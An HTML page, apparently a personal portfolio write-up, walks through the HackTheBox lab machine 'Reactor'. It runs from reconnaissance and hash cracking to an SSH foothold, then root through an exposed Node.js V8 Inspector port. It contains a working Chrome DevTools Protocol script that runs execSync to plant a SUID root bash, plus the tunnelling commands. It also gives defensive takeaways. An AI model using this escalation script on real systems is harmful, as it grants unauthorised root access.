@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Reactor | Zakir Hussain</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+:root{
+  --bg:#0a0e17;
+  --bg-elev:#0e1420;
+  --bg-card:#111827;
+  --bg-code:#0b1018;
+  --border:#1e2838;
+  --border-soft:#172030;
+  --text:#dbe4ef;
+  --text-dim:#8b98ac;
+  --text-faint:#5b6678;
+  --accent:#2dd4a7;
+  --accent-soft:rgba(45,212,167,.12);
+  --accent-2:#38bdf8;
+  --warn:#f59e0b;
+  --danger:#ef4444;
+  --easy:#2dd4a7;
+  --medium:#f5a623;
+  --hard:#ef5a6f;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+@media (prefers-color-scheme: light){
+  :root{ color-scheme: dark; }
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;}
+body{
+  background:
+    radial-gradient(1100px 500px at 15% -5%, rgba(45,212,167,.07), transparent 60%),
+    radial-gradient(900px 500px at 100% 0%, rgba(56,189,248,.05), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--accent-soft); color:var(--text);}
+a{color:var(--accent-2); text-decoration:none;}
+a:hover{text-decoration:underline;}
+.wrap{max-width:860px; margin:0 auto; padding:0 24px 96px;}
+
+/* ---------- topbar ---------- */
+.topbar{
+  border-bottom:1px solid var(--border-soft);
+  background:rgba(10,14,23,.85);
+  backdrop-filter:blur(8px);
+  position:sticky; top:0; z-index:20;
+}
+.topbar-inner{
+  max-width:860px; margin:0 auto; padding:14px 24px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.back-link{
+  font-family:var(--mono); font-size:13px; color:var(--text-dim);
+  display:flex; align-items:center; gap:6px;
+}
+.back-link:hover{color:var(--accent); text-decoration:none;}
+.brand{
+  font-family:var(--mono); font-size:13px; color:var(--text-faint); letter-spacing:.03em;
+}
+
+/* ---------- hero ---------- */
+.hero{padding:48px 0 28px; border-bottom:1px solid var(--border-soft);}
+.eyebrow{
+  font-family:var(--mono); font-size:12.5px; color:var(--accent);
+  letter-spacing:.04em; margin:0 0 14px;
+  display:flex; align-items:center; gap:8px;
+}
+.eyebrow::before{content:"//"; color:var(--text-faint);}
+h1.machine-title{
+  font-family:var(--mono); font-weight:700; font-size:clamp(32px,6vw,48px);
+  margin:0 0 14px; color:#fff; letter-spacing:-.01em;
+}
+.badges{display:flex; flex-wrap:wrap; gap:8px; margin-bottom:20px;}
+.badge{
+  font-family:var(--mono); font-size:12px; padding:5px 11px; border-radius:5px;
+  border:1px solid var(--border); background:var(--bg-card); color:var(--text-dim);
+  display:inline-flex; align-items:center; gap:6px;
+}
+.badge.diff-Easy{color:var(--easy); border-color:rgba(45,212,167,.35); background:rgba(45,212,167,.08);}
+.badge.diff-Medium{color:var(--medium); border-color:rgba(245,166,35,.35); background:rgba(245,166,35,.08);}
+.badge.diff-Hard{color:var(--hard); border-color:rgba(239,90,111,.35); background:rgba(239,90,111,.08);}
+.badge.os{color:var(--accent-2);}
+.synopsis{color:var(--text-dim); font-size:16px; max-width:70ch; margin:0;}
+.tags{display:flex; flex-wrap:wrap; gap:6px; margin-top:18px;}
+.tag{
+  font-family:var(--mono); font-size:11.5px; color:var(--text-faint);
+  border:1px solid var(--border-soft); padding:3px 9px; border-radius:999px;
+}
+
+/* ---------- info table ---------- */
+.info-grid{
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+  gap:1px; background:var(--border-soft); border:1px solid var(--border-soft);
+  border-radius:10px; overflow:hidden; margin:28px 0 8px;
+}
+.info-cell{background:var(--bg-card); padding:14px 16px;}
+.info-cell .k{font-family:var(--mono); font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px;}
+.info-cell .v{font-family:var(--mono); font-size:14px; color:var(--text);}
+
+/* ---------- section ---------- */
+section.phase{padding:40px 0; border-bottom:1px solid var(--border-soft);}
+section.phase:last-of-type{border-bottom:none;}
+.phase-head{display:flex; align-items:baseline; gap:12px; margin-bottom:6px;}
+.phase-num{font-family:var(--mono); color:var(--accent); font-size:14px;}
+h2.phase-title{font-family:var(--mono); font-size:22px; margin:0; color:#fff; font-weight:700;}
+.phase-intro{color:var(--text-dim); margin:10px 0 22px; max-width:72ch;}
+
+.step{margin:22px 0;}
+.step-title{
+  font-family:var(--mono); font-size:14.5px; color:var(--text); font-weight:700;
+  margin:0 0 4px; display:flex; align-items:center; gap:8px;
+}
+.step-title::before{content:"▸"; color:var(--accent);}
+.why{
+  font-size:14.5px; color:var(--text-dim); margin:6px 0 10px; padding-left:18px;
+  border-left:2px solid var(--border-soft);
+}
+.why b{color:var(--accent); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+pre{
+  background:var(--bg-code); border:1px solid var(--border);
+  border-radius:8px; padding:14px 16px; overflow-x:auto;
+  font-family:var(--mono); font-size:13px; line-height:1.55; margin:10px 0;
+  color:#c9d6e8;
+}
+pre.cmd{border-left:3px solid var(--accent);}
+pre.out{border-left:3px solid var(--accent-2); color:#9fb0c3;}
+code{font-family:var(--mono); font-size:.92em;}
+.inline-code{background:var(--bg-code); border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--accent); font-size:.88em;}
+
+.next{font-size:14.5px; color:var(--text-dim); margin:10px 0 0; padding-left:18px; border-left:2px solid rgba(56,189,248,.35);}
+.next b{color:var(--accent-2); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+.callout{
+  border:1px solid var(--border); border-left:3px solid var(--warn);
+  background:rgba(245,166,35,.06); border-radius:8px; padding:14px 18px; margin:18px 0;
+}
+.callout.cve{border-left-color:var(--danger); background:rgba(239,90,111,.06);}
+.callout .ctitle{font-family:var(--mono); font-size:12.5px; color:var(--warn); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; font-weight:700;}
+.callout.cve .ctitle{color:var(--danger);}
+.callout p{margin:0; color:var(--text-dim); font-size:14.5px;}
+
+.flagbox{
+  font-family:var(--mono); background:var(--bg-code); border:1px dashed var(--border);
+  border-radius:8px; padding:12px 16px; margin:10px 0; display:flex; align-items:center; gap:10px;
+  font-size:13.5px; color:var(--accent);
+}
+.flagbox .lbl{color:var(--text-faint); font-size:11px; text-transform:uppercase; letter-spacing:.06em;}
+
+table.vulns{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px;}
+table.vulns th, table.vulns td{border:1px solid var(--border-soft); padding:9px 12px; text-align:left;}
+table.vulns th{background:var(--bg-card); font-family:var(--mono); font-size:11.5px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em;}
+table.vulns td{color:var(--text-dim);}
+
+.chain{
+  font-family:var(--mono); font-size:12.5px; color:var(--text-dim);
+  background:var(--bg-code); border:1px solid var(--border); border-radius:8px;
+  padding:16px; overflow-x:auto; white-space:pre; margin:20px 0;
+}
+
+ul.rec-list{margin:10px 0; padding-left:0; list-style:none;}
+ul.rec-list li{
+  padding:8px 0 8px 26px; position:relative; color:var(--text-dim); font-size:14.5px;
+  border-bottom:1px solid var(--border-soft);
+}
+ul.rec-list li:last-child{border-bottom:none;}
+ul.rec-list li::before{content:"→"; position:absolute; left:0; color:var(--accent);}
+
+.summary-box{
+  background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
+  padding:22px 24px; margin:24px 0;
+}
+.summary-box h3{font-family:var(--mono); font-size:15px; color:#fff; margin:0 0 10px;}
+
+footer.page-footer{
+  padding:40px 0 10px; text-align:center; color:var(--text-faint); font-family:var(--mono); font-size:12.5px;
+}
+footer.page-footer a{color:var(--text-dim);}
+.foot-nav{margin-bottom:14px;}
+
+@media (max-width:600px){
+  .wrap{padding:0 16px 72px;}
+  h1.machine-title{font-size:30px;}
+}
+
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-inner">
+    <a class="back-link" href="https://zak5886.github.io/Portfolio/#writeups">&larr; back to writeups</a>
+    <span class="brand">ZAKIR_HUSSAIN / HTB_WRITEUPS</span>
+  </div>
+</div>
+<div class="wrap">
+
+<div class="hero">
+  <p class="eyebrow">HTB_WRITEUP // reactor.log</p>
+  <h1 class="machine-title">Reactor</h1>
+  <div class="badges"><span class="badge diff-Easy">Easy</span><span class="badge os">Linux</span></div>
+  <p class="synopsis">Reactor is an Easy-difficulty Linux box built around a mistake that's easy to miss and expensive to make: an internal debugging interface left reachable by a low-privileged account. Initial access comes from a leaked SQLite database and a crackable password hash; root comes from a root-owned Node.js process exposing its V8 Inspector debug port on loopback, which turns into full remote code execution once it's tunnelled out over SSH.</p>
+  <div class="tags"><span class="tag">nmap</span><span class="tag">lpd</span><span class="tag">sqlite</span><span class="tag">hash-cracking</span><span class="tag">ssh</span><span class="tag">nodejs</span><span class="tag">v8-inspector</span><span class="tag">chrome-devtools-protocol</span><span class="tag">suid</span></div>
+</div>
+<div class="info-grid"><div class="info-cell"><div class="k">Target</div><div class="v">Reactor</div></div><div class="info-cell"><div class="k">Difficulty</div><div class="v">Easy</div></div><div class="info-cell"><div class="k">OS</div><div class="v">Linux</div></div><div class="info-cell"><div class="k">Primary Vuln</div><div class="v">Node.js Inspector RCE</div></div><div class="info-cell"><div class="k">Foothold</div><div class="v">SSH (cracked creds)</div></div><div class="info-cell"><div class="k">Priv-Esc</div><div class="v">CDP / child_process.execSync</div></div></div>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 1</span></div>
+  <h2 class="phase-title">Reconnaissance & Database Exposure</h2>
+  <p class="phase-intro">Standard full-port nmap sweep first, then chase whatever the web stack hands over. On Reactor the web component leaks a raw database file, which is the whole game for initial access.</p>
+  
+<div class="step">
+  <p class="step-title">Full TCP port scan</p>
+  <p class="why"><b>Why</b>Before touching the application layer, enumerate every open port rather than trusting a default top-1000 scan &mdash; an easy box will often hide the real entry point on a non-default port.</p>
+  <pre class="cmd">nmap -sC -sV -p- [TARGET_IP]</pre>
+  
+  <p class="next"><b>Next</b>With the open services mapped, walk the web app for anything that looks like a file download, backup, or debug export &mdash; that's usually the fastest path to a credential on an Easy box.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Pull the exposed database file</p>
+  <p class="why"><b>Why</b>The web component exposed a path that let me retrieve <span class="inline-code">reactor.db</span> directly, either via a misconfigured download endpoint or basic directory traversal in a file-serving route. Grabbing the raw SQLite file beats trying to blind-SQL-inject through the app &mdash; if the DB is reachable as a flat file, just take it.</p>
+  
+  
+  <p class="next"><b>Next</b>Open the database locally and inspect every table for anything resembling a credential store.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Crack the recovered password hash</p>
+  <p class="why"><b>Why</b>The database held an account's password hash. Rather than guess the hashing scheme blind, I ran it through a generic cracking pass against <span class="inline-code">rockyou.txt</span> &mdash; the standard first move on any HTB box, since weak lab credentials are almost always in that list.</p>
+  
+  <pre class="out">User:     engineer
+Password: reactor1</pre>
+  <p class="next"><b>Next</b>Use the recovered credentials against the exposed SSH service.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 2</span></div>
+  <h2 class="phase-title">Foothold via SSH</h2>
+  <p class="phase-intro">With a cracked credential pair in hand, authenticate directly &mdash; no exploit chain needed for the initial shell.</p>
+  
+<div class="step">
+  <p class="step-title">Authenticate over SSH</p>
+  <p class="why"><b>Why</b>SSH was open on the standard port and accepting password auth. Valid creds mean a straightforward login rather than needing to chain a web exploit for code execution.</p>
+  <pre class="cmd">ssh engineer@[TARGET_IP]</pre>
+  
+  <p class="next"><b>Next</b>Grab the user flag to confirm foothold, then start enumerating what's running locally that <code>engineer</code> can't see from outside.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm user flag</p>
+  <p class="why"><b>Why</b>Standard checkpoint before moving on to privilege escalation &mdash; confirms the shell is stable and the home directory is accessible.</p>
+  <pre class="cmd">cat user.txt</pre>
+  <pre class="out">[USER_FLAG_REDACTED]</pre>
+  
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 3</span></div>
+  <h2 class="phase-title">Privilege Escalation &mdash; Node.js V8 Inspector</h2>
+  <p class="phase-intro">This is the actual lesson of the box. A root-owned Node.js process was running with its debugger exposed on <span class="inline-code">127.0.0.1:9229</span> &mdash; the default port for the Node V8 Inspector. Loopback-only sounds safe until you remember SSH port forwarding exists.</p>
+  <div class="callout"><div class="ctitle">Why this matters</div><p>The V8 Inspector is a full remote-debugging protocol (Chrome DevTools Protocol / CDP). Anyone who can reach the socket can evaluate arbitrary JavaScript inside that process's context. If the process is root, the attacker's JS runs as root.</p></div>
+<div class="step">
+  <p class="step-title">Identify the exposed debug port</p>
+  <p class="why"><b>Why</b>Checked listening sockets from inside the box to find services bound only to localhost &mdash; these are usually assumed 'safe' by whoever configured them, which makes them worth checking first.</p>
+  <pre class="cmd">ss -lntp   # or: netstat -antp</pre>
+  <pre class="out">tcp   LISTEN   0   511   127.0.0.1:9229   0.0.0.0:*</pre>
+  <p class="next"><b>Next</b>127.0.0.1:9229 is the V8 Inspector's default port. If it isn't already listening, it can be triggered by launching Node with --inspect-brk.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">(If needed) trigger an inspector listener</p>
+  <p class="why"><b>Why</b>If a debug-enabled Node process isn't already running, <span class="inline-code">--inspect-brk</span> starts one and pauses at the first line, waiting for a debugger to attach &mdash; useful for demonstrating the primitive even if the box's real root process already had it open.</p>
+  <pre class="cmd">node --inspect-brk=0 -e "require('child_process').execSync('cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash')"</pre>
+  <pre class="out">Debugger listening on ws://127.0.0.1:42109/[UUID]
+For help, see: https://nodejs.org/en/docs/inspector</pre>
+  <p class="next"><b>Next</b>The debug port only accepts local connections on the target, so it has to be tunnelled before it can be reached from the attacking machine.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Forward the debug port over SSH</p>
+  <p class="why"><b>Why</b>The Inspector binds to loopback by design &mdash; but SSH local port forwarding makes 'loopback-only' meaningless for anyone who already has a shell. This is the step that actually breaks the trust boundary.</p>
+  <pre class="cmd">ssh -L 9229:127.0.0.1:9229 engineer@[TARGET_IP]</pre>
+  
+  <p class="next"><b>Next</b>With 9229 now reachable on localhost from the attacking machine, connect to it with a CDP client.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 4</span></div>
+  <h2 class="phase-title">Exploit Execution &mdash; Chrome DevTools Protocol</h2>
+  <p class="phase-intro">Rather than relying on the interactive Node REPL (which may not be available), I automated the exploit with <span class="inline-code">chrome-remote-interface</span>, a Node library that speaks CDP directly. This is the more reliable, repeatable approach for a report &mdash; a script beats a one-off interactive session.</p>
+  
+<div class="step">
+  <p class="step-title">Set up the exploit project</p>
+  <p class="why"><b>Why</b>Isolate dependencies in a fresh project directory so the exploit is portable and doesn't collide with anything else on the attack host.</p>
+  <pre class="cmd">mkdir reactor-exploit &amp;&amp; cd reactor-exploit
+npm install chrome-remote-interface</pre>
+  
+  
+</div>
+
+<div class="step">
+  <p class="step-title">Craft the CDP payload script</p>
+  <p class="why"><b>Why</b>The script connects to the forwarded port, resolves the Node <code>process</code> global safely across environments, pulls in <span class="inline-code">child_process</span> via the module loader, and runs a single command: copy <code>/bin/bash</code> to <code>/tmp</code> and set the SUID bit on it. That's the whole privilege-escalation primitive &mdash; a SUID shell owned by root.</p>
+  <pre class="cmd">const CDP = require('chrome-remote-interface');
+
+async function pwn() {
+    const client = await CDP({ port: 9229 });
+    const { Runtime } = client;
+    const codeToExecute = `
+        (() =&gt; {
+            const proc = typeof process !== 'undefined' ? process : global.process;
+            const req = proc.mainModule ? proc.mainModule.require : module.require;
+            const cp = req('child_process');
+            cp.execSync('cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash');
+            return 'SUID shell created successfully at /tmp/rootbash';
+        })()
+    `;
+    const response = await Runtime.evaluate({ expression: codeToExecute, returnByValue: true });
+    console.log(response.result.value);
+    await client.close();
+}
+pwn();</pre>
+  
+  <p class="next"><b>Next</b>Run the script with the SSH tunnel still open in another terminal.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Fire the exploit</p>
+  <p class="why"><b>Why</b>With the tunnel active, this sends the payload to the root Node process's debugger and executes it in that process's context.</p>
+  <pre class="cmd">node privEsc.js</pre>
+  <pre class="out">--- Remote Execution Result ---
+SUID shell created successfully at /tmp/rootbash
+--------------------------------</pre>
+  <p class="next"><b>Next</b>Return to the engineer SSH session and invoke the new SUID binary.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Spawn the root shell</p>
+  <p class="why"><b>Why</b>Modern bash drops elevated privileges by default when invoked from a SUID context unless told not to &mdash; the <span class="inline-code">-p</span> flag preserves effective privileges, which is the entire point of having made the binary SUID in the first place.</p>
+  <pre class="cmd">/tmp/rootbash -p
+whoami</pre>
+  <pre class="out">root</pre>
+  <p class="next"><b>Next</b>Grab the root flag to close out the box.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm root flag</p>
+  <p class="why"><b>Why</b>Final checkpoint confirming full compromise.</p>
+  <pre class="cmd">cat /root/root.txt</pre>
+  <pre class="out">[ROOT_FLAG_REDACTED]</pre>
+  
+</div>
+
+  
+</section>
+<div class="summary-box"><h3>Key Takeaways</h3><ul class="rec-list"><li>Never bind a debugging/inspection interface to a privileged process, even on loopback &mdash; SSH tunnelling erases the "localhost-only" assumption for anyone with shell access.</li><li>The V8 Inspector / Chrome DevTools Protocol grants full code execution in the context of the attached process; it should never be reachable by a process running with elevated privileges in a multi-user environment.</li><li>Weak, dictionary-crackable application credentials (<code>reactor1</code>) were the actual root cause of the initial foothold &mdash; strong password policy would have stopped the chain at step one.</li><li>Flat database files should never be directly downloadable from a web root; files like <code>reactor.db</code> belong outside the served directory entirely.</li></ul></div>
+<footer class="page-footer">
+  <div class="foot-nav"><a href="https://zak5886.github.io/Portfolio/#writeups">&larr; All writeups</a> &nbsp;|&nbsp; <a href="https://zak5886.github.io/Portfolio/">Portfolio home</a></div>
+  Educational penetration testing writeup &middot; HackTheBox lab environment &middot; &copy; 2026 Zakir Hussain
+</footer>
+</div>
+</body>
+</html>
